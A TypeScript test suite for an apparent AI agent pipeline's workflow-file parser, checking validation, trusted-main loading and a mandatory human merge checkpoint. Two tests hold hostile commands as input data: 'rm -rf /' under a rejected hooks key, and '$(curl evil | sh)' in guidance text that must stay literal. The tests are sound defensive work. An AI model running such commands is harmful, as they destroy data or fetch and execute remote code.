import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { describe, it } from "node:test";
import { digestOf } from "../src/run.ts";
import { STAGE_ORDER, STAGE_PROFILES } from "../src/stages.ts";
import {
	checkReport,
	DEFAULT_MODEL,
	type EnvLookup,
	type Exec,
	githubRepoFromRemote,
	isRepoSlug,
	loadWorkflow,
	MODEL_STAGES,
	modelsOf,
	parseWorkflow,
	type RepoSlug,
	reloadWorkflow,
	statusReport,
	WORKFLOW_PATH,
	type WorkflowError,
	type WorkflowLoad,
} from "../src/workflow.ts";

function slug(text: string): RepoSlug {
	if (!isRepoSlug(text)) throw new Error(`bad slug ${text}`);

	return text;
}

const repo = slug("giuseppecrj/pi-herdr-factorio");
const mainSha = "a".repeat(40);
const candidateSha = "b".repeat(40);

const env: EnvLookup = (name) =>
	({ HOME: "/home/factory", FACTORY_WORKSPACES: "/srv/workspaces" })[name];

const valid = `---
repository: giuseppecrj/pi-herdr-factorio
polling:
  interval_ms: 30000
agent:
  max_concurrent: 2
stages:
  build:
    max_turns: 30
---
General guidance.

## build
Write the test first.

## review
Read the diff.
`;

function frontMatter(lines: string): string {
	return `---\nrepository: giuseppecrj/pi-herdr-factorio\n${lines}\n---\nbody\n`;
}

function parse(text: string) {
	return parseWorkflow({ text, repo, env });
}

function errorOf(text: string): WorkflowError {
	const parsed = parse(text);

	assert.equal(parsed.kind, "invalid", "expected the workflow to be invalid");

	if (parsed.kind !== "invalid") throw new Error("unreachable");

	return parsed.error;
}

function validation(text: string): { field: string; message: string } {
	const error = errorOf(text);

	if (error.kind !== "workflow_validation_error") {
		throw new Error(`expected a validation error, got ${error.kind}`);
	}

	return error;
}

type Branch = { sha: string; text: string | null };

type FakeGh = { exec: Exec; calls: string[][] };

// A fake `gh`: branches map a ref to its SHA and the file at that SHA.
function fakeGh(branches: Map<string, Branch>): FakeGh {
	const calls: string[][] = [];

	const exec: Exec = async (command, args) => {
		calls.push([command, ...args]);
		const path = args.find((arg) => arg.startsWith("repos/")) ?? "";
		const ref = /\/git\/ref\/heads\/(.+)$/.exec(path)?.[1];

		if (ref !== undefined) {
			const branch = branches.get(ref);

			return branch === undefined
				? { stdout: "", stderr: "gh: Not Found (HTTP 404)", code: 1 }
				: { stdout: `${branch.sha}\n`, stderr: "", code: 0 };
		}

		const sha = /\?ref=([0-9a-f]{40})$/.exec(path)?.[1];

		const branch = [...branches.values()].find(
			(candidate) => candidate.sha === sha,
		);

		if (branch === undefined || branch.text === null) {
			return { stdout: "", stderr: "gh: Not Found (HTTP 404)", code: 1 };
		}

		return { stdout: branch.text, stderr: "", code: 0 };
	};

	return { exec, calls };
}

async function load(
	branches: Map<string, Branch>,
	ref = "main",
): Promise<WorkflowLoad> {
	return loadWorkflow({ exec: fakeGh(branches).exec, repo, ref, env });
}

describe("parseWorkflow", () => {
	it("accepts the committed production WORKFLOW.md", () => {
		const parsed = parse(readFileSync(WORKFLOW_PATH, "utf8"));

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		assert.deepEqual(parsed.warnings, []);
		assert.equal(parsed.config.polling.intervalMs, 30_000);
		assert.equal(parsed.config.agent.maxConcurrent, 2);
		assert.equal(parsed.config.checkpoints.approveMerge.mode, "always");

		for (const stage of MODEL_STAGES) {
			assert.equal(parsed.config.stages[stage].model, "openai/gpt-6.1-sol");
			assert.ok(parsed.guidance.stages[stage], `${stage} has guidance`);
		}
	});

	it("parses front matter, defaults and stage guidance", () => {
		const parsed = parse(valid);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		const { config, guidance } = parsed;

		assert.equal(config.repository, repo);
		assert.equal(config.polling.intervalMs, 30_000);
		assert.equal(config.agent.maxConcurrent, 2);
		assert.equal(config.stages.build.budget.maxTurns, 30);
		assert.equal(config.stages.review.budget.maxTurns, 20);
		assert.equal(config.stages.review.budget.stallMs, 300_000);
		assert.equal(config.retry.maxBackoffMs, 300_000);
		assert.equal(config.checkpoints.approveMerge.mode, "always");
		assert.equal(guidance.general, "General guidance.");
		assert.equal(guidance.stages.build, "Write the test first.");
		assert.equal(guidance.stages.review, "Read the diff.");
		assert.equal(guidance.stages.specify, undefined);
		assert.deepEqual(parsed.warnings, []);
	});

	it("defaults every model stage to openai/gpt-6.1-sol", () => {
		const parsed = parse(frontMatter(""));

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		for (const stage of MODEL_STAGES) {
			assert.equal(parsed.config.stages[stage].model, DEFAULT_MODEL);
		}

		assert.equal(DEFAULT_MODEL, "openai/gpt-6.1-sol");
	});

	it("names exactly the stages that STAGE_PROFILES gives model access", () => {
		const withModels = STAGE_ORDER.filter(
			(stage) => STAGE_PROFILES[stage].modelAccess !== "none",
		);

		assert.deepEqual([...MODEL_STAGES], withModels);
	});

	it("freezes the parsed config", () => {
		const parsed = parse(valid);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind !== "valid") return;

		assert.ok(Object.isFrozen(parsed.config));
		assert.ok(Object.isFrozen(parsed.config.stages.build.budget));
		assert.ok(Object.isFrozen(parsed.guidance.stages));
	});

	it("requires front matter", () => {
		assert.equal(
			errorOf("# no front matter\n").kind,
			"workflow_front_matter_missing",
		);
	});

	it("reports bad YAML as a parse error", () => {
		assert.equal(
			errorOf("---\nrepository: [\n---\n").kind,
			"workflow_parse_error",
		);
		assert.equal(errorOf("---\nrepository: x\n").kind, "workflow_parse_error");
		assert.equal(
			errorOf("---\na: 1\na: 2\n---\n").kind,
			"workflow_parse_error",
		);
	});

	it("rejects front matter that is not a map", () => {
		assert.equal(
			errorOf("---\n- a\n- b\n---\n").kind,
			"workflow_front_matter_not_a_map",
		);
		assert.equal(
			errorOf("---\n---\nbody\n").kind,
			"workflow_front_matter_not_a_map",
		);
	});

	it("requires the repository to match the caller", () => {
		assert.equal(
			validation("---\npolling:\n  interval_ms: 30000\n---\n").field,
			"repository",
		);

		const other = validation("---\nrepository: someone/else\n---\n");

		assert.equal(other.field, "repository");
		assert.match(other.message, /someone\/else/);
	});

	it("rejects zero and negative budgets", () => {
		for (const value of ["0", "-1"]) {
			const error = validation(
				frontMatter(`stages:\n  build:\n    wall_ms: ${value}`),
			);

			assert.equal(error.field, "stages.build.wall_ms");
			assert.match(error.message, /positive integer/);
		}

		assert.equal(
			validation(frontMatter("usage:\n  max_tokens_per_run: 0")).field,
			"usage.max_tokens_per_run",
		);

		assert.equal(
			validation(frontMatter("retry:\n  max_attempts: -3")).field,
			"retry.max_attempts",
		);

		assert.equal(
			validation(frontMatter("stages:\n  admit:\n    stall_ms: 0")).field,
			"stages.admit.stall_ms",
		);
	});

	it("bounds the poll interval and concurrency", () => {
		assert.equal(
			validation(frontMatter("polling:\n  interval_ms: 9999")).field,
			"polling.interval_ms",
		);

		assert.equal(
			validation(frontMatter("agent:\n  max_concurrent: 5")).field,
			"agent.max_concurrent",
		);

		assert.equal(
			validation(frontMatter("agent:\n  max_concurrent: two")).field,
			"agent.max_concurrent",
		);
	});

	it("rejects provider anthropic with the owner rule", () => {
		const error = validation(
			frontMatter("stages:\n  review:\n    model: anthropic/claude-sonnet-5-5"),
		);

		assert.equal(error.field, "stages.review.model");
		assert.match(error.message, /exe\.dev credits/);
	});

	it("rejects malformed model IDs and a model key on a no-model stage", () => {
		assert.equal(
			validation(frontMatter("stages:\n  build:\n    model: gpt")).field,
			"stages.build.model",
		);

		assert.equal(
			validation(frontMatter("stages:\n  land:\n    model: openai/gpt-6.1-sol"))
				.field,
			"stages.land.model",
		);

		assert.equal(
			validation(frontMatter("stages:\n  deploy: {}")).field,
			"stages.deploy",
		);
	});

	it("expands $VAR only in workspace.root and never in other fields", () => {
		const parsed = parse(
			frontMatter("workspace:\n  root: $FACTORY_WORKSPACES"),
		);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.equal(parsed.config.workspace.root, "/srv/workspaces");
			assert.equal(parsed.config.workspace.rootSource, "$FACTORY_WORKSPACES");
		}

		const error = validation(
			frontMatter("stages:\n  build:\n    model: $MODEL"),
		);

		assert.equal(error.field, "stages.build.model");
		assert.match(error.message, /only in workspace\.root/);

		assert.equal(
			validation(frontMatter("workspace:\n  root: $UNSET_VARIABLE")).field,
			"workspace.root",
		);

		assert.equal(
			validation(frontMatter("workspace:\n  root: $HOME/x")).field,
			"workspace.root",
		);

		assert.equal(
			validation(frontMatter("workspace:\n  root: relative/dir")).field,
			"workspace.root",
		);
	});

	it("expands ~ in workspace.root from the passed environment", () => {
		const parsed = parse(frontMatter(""));

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.equal(
				parsed.config.workspace.root,
				"/home/factory/factory-workspaces",
			);
		}
	});

	it("rejects unknown checkpoint modes and removing the merge checkpoint", () => {
		const auto = validation(
			frontMatter("checkpoints:\n  approve_merge:\n    mode: auto"),
		);

		assert.equal(auto.field, "checkpoints.approve_merge.mode");
		assert.match(auto.message, /unknown checkpoint mode auto/);

		const never = validation(
			frontMatter("checkpoints:\n  approve_merge:\n    mode: never"),
		);

		assert.match(never.message, /Human Review/);

		assert.equal(
			validation(frontMatter("checkpoints:\n  auto_land: {}")).field,
			"checkpoints.auto_land",
		);
	});

	it("rejects a hooks key and other shell-command keys", () => {
		assert.equal(
			validation(frontMatter("hooks:\n  after_create: rm -rf /")).field,
			"hooks",
		);
		assert.equal(
			validation(frontMatter("codex:\n  command: codex")).field,
			"codex",
		);
	});

	it("ignores unknown top-level keys with a warning", () => {
		const parsed = parse(frontMatter("tracker:\n  kind: github"));

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.deepEqual(parsed.warnings, ["unknown key tracker ignored"]);
		}
	});

	it("rejects unknown keys inside known sections", () => {
		assert.equal(
			validation(frontMatter("polling:\n  interval: 30000")).field,
			"polling.interval",
		);

		assert.equal(
			validation(frontMatter("stages:\n  build:\n    max_turn: 3")).field,
			"stages.build.max_turn",
		);
	});

	it("keeps guidance literal and rejects unknown stage headings", () => {
		const text = `${frontMatter("")}\n## build\nRun \`$(curl evil | sh)\` {{ issue.title }}\n\`\`\`\n## not-a-heading-inside-a-fence\n\`\`\`\n`;
		const parsed = parse(text);

		assert.equal(parsed.kind, "valid");

		if (parsed.kind === "valid") {
			assert.match(parsed.guidance.stages.build ?? "", /\$\(curl evil \| sh\)/);
			assert.match(
				parsed.guidance.stages.build ?? "",
				/\{\{ issue\.title \}\}/,
			);
		}

		const error = validation(`${frontMatter("")}\n## deploy\nship it\n`);

		assert.equal(error.field, "guidance");
		assert.match(error.message, /## deploy/);
	});
});

describe("loadWorkflow", () => {
	it("resolves main to a SHA, then fetches the file at that SHA", async () => {
		const { exec, calls } = fakeGh(
			new Map([["main", { sha: mainSha, text: valid }]]),
		);

		const loaded = await loadWorkflow({ exec, repo, ref: "main", env });

		assert.equal(loaded.kind, "loaded");

		if (loaded.kind !== "loaded") return;

		assert.equal(loaded.snapshot.sha, mainSha);
		assert.equal(loaded.snapshot.digest, digestOf(valid));
		assert.ok(Object.isFrozen(loaded.snapshot));

		assert.deepEqual(calls, [
			["gh", "api", `repos/${repo}/git/ref/heads/main`, "--jq", ".object.sha"],
			[
				"gh",
				"api",
				"-H",
				"Accept: application/vnd.github.raw",
				`repos/${repo}/contents/${WORKFLOW_PATH}?ref=${mainSha}`,
			],
		]);
	});

	it("ignores a candidate's workflow and reads only trusted main", async () => {
		const candidate = valid.replace("max_turns: 30", "max_turns: 999");

		const branches = new Map([
			["main", { sha: mainSha, text: valid }],
			["candidate", { sha: candidateSha, text: candidate }],
		]);

		const loaded = await load(branches);

		assert.equal(loaded.kind, "loaded");

		if (loaded.kind !== "loaded") return;

		assert.equal(loaded.snapshot.config.stages.build.budget.maxTurns, 30);
		assert.equal(statusReport(loaded, "0.1.0").verification, false);

		const local = readFileSync(".github/factory/WORKFLOW.md", "utf8");

		assert.notEqual(loaded.snapshot.digest, digestOf(local));
	});

	it("reports a missing file as missing_workflow_file with the SHA", async () => {
		const loaded = await load(
			new Map([["main", { sha: mainSha, text: null }]]),
		);

		assert.equal(loaded.kind, "failed");

		if (loaded.kind !== "failed") return;

		assert.equal(loaded.error.kind, "missing_workflow_file");
		assert.equal(loaded.sha, mainSha);
		assert.match(loaded.error.message, /not found/);
	});

	it("reports an unresolvable ref as source_unavailable", async () => {
		const loaded = await load(new Map(), "main");

		assert.equal(loaded.kind, "failed");

		if (loaded.kind === "failed") {
			assert.equal(loaded.error.kind, "source_unavailable");
			assert.equal(loaded.sha, null);
		}

		const bad = await load(new Map(), "../main");

		assert.equal(bad.kind, "failed");
	});

	it("keeps the digest of a fetched file that fails validation", async () => {
		const broken = frontMatter("agent:\n  max_concurrent: 0");

		const loaded = await load(
			new Map([["main", { sha: mainSha, text: broken }]]),
		);

		assert.equal(loaded.kind, "failed");

		if (loaded.kind === "failed") {
			assert.equal(loaded.digest, digestOf(broken));
			assert.equal(loaded.error.kind, "workflow_validation_error");
		}
	});
});

describe("reloadWorkflow", () => {
	it("keeps the last valid snapshot when a reload is invalid", async () => {
		const first = await load(
			new Map([["main", { sha: mainSha, text: valid }]]),
		);

		const second = await load(
			new Map([
				[
					"main",
					{
						sha: candidateSha,
						text: frontMatter("polling:\n  interval_ms: 0"),
					},
				],
			]),
		);

		assert.equal(first.kind, "loaded");

		if (first.kind !== "loaded") return;

		const reload = reloadWorkflow(first.snapshot, second);

		assert.equal(reload.kind, "kept");

		if (reload.kind !== "kept") return;

		assert.equal(reload.snapshot.digest, digestOf(valid));
		assert.equal(reload.error.kind, "workflow_validation_error");

		const report = checkReport(second, { next: second, result: reload });

		assert.equal(report.reload?.outcome, "kept");
		assert.equal(report.reload?.inForce?.digest, digestOf(valid));
	});

	it("applies a valid reload and has nothing in force without a valid load", async () => {
		const next = await load(new Map([["main", { sha: mainSha, text: valid }]]));

		assert.equal(reloadWorkflow(null, next).kind, "applied");

		const missing = await load(
			new Map([["main", { sha: mainSha, text: null }]]),
		);

		assert.equal(reloadWorkflow(null, missing).kind, "unavailable");
	});
});

describe("reports", () => {
	it("status reports trusted settings with execution disabled", async () => {
		const loaded = await load(
			new Map([["main", { sha: mainSha, text: valid }]]),
		);

		const report = statusReport(loaded, "0.1.0");

		assert.equal(report.workflowSha, mainSha);
		assert.equal(report.workflowDigest, digestOf(valid));
		assert.equal(report.executionEnabled, false);
		assert.equal(report.controller.state, "unavailable");
		assert.equal(report.models?.build, DEFAULT_MODEL);
		assert.equal(report.limits?.pollIntervalMs, 30_000);
		assert.doesNotMatch(JSON.stringify(report), /githubToken|github token/i);
	});

	it("status carries the error and no settings when the workflow is invalid", async () => {
		const report = statusReport(
			await load(new Map([["main", { sha: mainSha, text: null }]])),
			"0.1.0",
		);

		assert.equal(report.workflow, "invalid");
		assert.equal(report.workflowError?.kind, "missing_workflow_file");
		assert.equal(report.models, null);
		assert.equal(report.executionEnabled, false);
	});

	it("marks a non-main ref as verification", async () => {
		const loaded = await load(
			new Map([["fixture", { sha: candidateSha, text: valid }]]),
			"fixture",
		);

		assert.equal(checkReport(loaded, null).verification, true);
	});

	it("never prints the expanded workspace root", async () => {
		const text = frontMatter("workspace:\n  root: $FACTORY_WORKSPACES");
		const loaded = await load(new Map([["main", { sha: mainSha, text }]]));
		const printed = JSON.stringify(checkReport(loaded, null));

		assert.match(printed, /\$FACTORY_WORKSPACES/);
		assert.doesNotMatch(printed, /\/srv\/workspaces/);
	});

	it("lists every model stage", async () => {
		const loaded = await load(
			new Map([["main", { sha: mainSha, text: valid }]]),
		);

		assert.equal(loaded.kind, "loaded");

		if (loaded.kind === "loaded") {
			assert.deepEqual(Object.keys(modelsOf(loaded.snapshot.config)), [
				...MODEL_STAGES,
			]);
		}
	});
});

describe("githubRepoFromRemote", () => {
	it("reads GitHub remotes and refuses others", () => {
		assert.equal(
			githubRepoFromRemote("git@github.com:giuseppecrj/pi-herdr-factorio.git"),
			repo,
		);
		assert.equal(
			githubRepoFromRemote(
				"https://github.com/giuseppecrj/pi-herdr-factorio\n",
			),
			repo,
		);
		assert.equal(
			githubRepoFromRemote(
				"ssh://git@github.com/giuseppecrj/pi-herdr-factorio.git",
			),
			repo,
		);
		assert.equal(
			githubRepoFromRemote(
				"https://gitlab.com/giuseppecrj/pi-herdr-factorio.git",
			),
			null,
		);
		assert.equal(githubRepoFromRemote("/srv/git/repo.git"), null);
	});
});
